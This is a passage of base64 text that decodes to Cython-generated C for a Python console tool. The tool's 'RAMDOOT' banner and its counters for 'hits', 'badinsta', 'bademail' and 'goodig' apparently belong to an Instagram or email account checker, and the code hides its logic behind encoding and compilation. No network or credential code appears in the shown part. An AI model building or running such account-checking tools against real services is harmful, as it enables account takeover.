gX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MOTlfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIF9fcHl4X0wxMDNfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF83LCAmX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Gb3JlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU3R5bGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDEwNl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb2xvcmFtYSwgX19weXhfdF81LCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Gb3JlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMTA2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxMDZfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU3R5bGUsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDEwNl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxMTFfdHJ5X2VuZDtcbiAgICBfX3B5eF9MMTA2X2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgNzAsIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTA4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfY29sb3JhbWF9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMTA3X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0wxMDhfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wxMDdfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0wxMTFfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAgX19weXhfdF81ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JlZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95ZWxsb3cpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkFNRE9PVH07XG4gICAgX19weXhfdF8xMCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbG9ycywgX19weXhfdF80LCBfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hbGlnbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NlbnRlciwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gICAgX19weXhfdF8zID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzEwKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SQU1ET09ULCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzEwID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkFNRE9PVCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90XzR9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RvdGFsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0cywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGluc3RhLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3OCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkZW1haWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kaWcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgwLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JPTEQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMW0pIDwgKDApKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NZQU4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTZtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9NQUdFTlRBLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xzk1bSkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWUVMTE9XLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzkzbSkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NywgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR1JFRU4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTJtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTFtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XSElURSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85N20pIDwgKDApKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JMVUUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTRtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTUFHRU5UQSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X3RfMn07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzIgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQk9MRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DWUFOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDk0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X